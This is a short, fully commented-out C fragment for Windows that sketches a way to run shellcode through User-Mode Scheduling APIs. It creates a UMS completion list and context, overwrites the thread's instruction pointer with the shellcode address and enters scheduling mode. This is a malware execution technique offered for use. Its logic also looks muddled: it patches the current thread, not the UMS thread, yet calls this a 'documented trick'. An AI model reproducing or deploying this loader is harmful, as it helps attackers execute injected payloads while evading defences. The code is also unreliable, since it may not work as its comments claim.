//void WINAPI UmsSchedulerProc(
//    UMS_SCHEDULER_REASON reason,
//    ULONG_PTR activationPayload,
//    PVOID schedulerParam
//) {
//    if (reason == UmsSchedulerThreadYield) {
//        // Shellcode yielded or exited
//        ExitThread(0);
//    }
//}
//
//void RunShellcodeUMS(void* shellcode) {
//    PUMS_COMPLETION_LIST cl = NULL;
//    PUMS_CONTEXT ctx = NULL;
//
//    CreateUmsCompletionList(&cl);
//
//    CreateUmsThreadContext(&ctx);
//
//    // Set shellcode as the UMS thread start
//    UmsThreadYield(ctx); // initializes context
//
//    // Manually patch RIP (documented trick)
//    CONTEXT c = { 0 };
//    c.ContextFlags = CONTEXT_CONTROL;
//    GetThreadContext(GetCurrentThread(), &c);
//    c.Rip = (DWORD64)shellcode;
//    SetThreadContext(GetCurrentThread(), &c);
//
//    UMS_SCHEDULER_STARTUP_INFO si = { 0 };
//    si.UmsVersion = UMS_VERSION;
//    si.CompletionList = cl;
//    si.SchedulerProc = UmsSchedulerProc;
//
//    EnterUmsSchedulingMode(&si);
//}